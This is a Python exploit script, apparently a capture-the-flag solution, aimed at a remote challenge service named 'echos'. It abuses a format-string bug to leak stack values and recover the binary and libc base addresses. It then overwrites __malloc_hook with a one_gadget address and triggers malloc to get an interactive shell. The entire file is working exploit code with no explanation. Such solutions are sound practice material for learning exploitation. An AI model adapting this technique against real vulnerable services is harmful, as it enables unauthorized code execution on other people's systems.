from roppy import *


elf = ELF("echos")
libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
p = remote('chal.duc.tf', 30001)


def send(payload):
	p.sendline(payload)


send("%18$p-%19$p")
leaks = p.recvline().split(b"-")
leak = int(leaks[0], 16)
log.info("LEAK:   0x%x" %(leak))

elf.address = leak - 0x890
log.info("ELF:    0x%x" %(elf.address))
leak = int(leaks[1], 16)
log.info("LEAK:  0x%x" %(leak))

libc.address = leak - libc.function("__libc_start_main") - 231
log.info("LIBC:  0x%x" %(libc.address))
one_gadget = libc.address + 0x4f322
malloc_hook = libc.symbol("__malloc_hook")

payload = fmtstr64(8, {malloc_hook: one_gadget})
send(payload)
send("%66000c")
p.interactive()
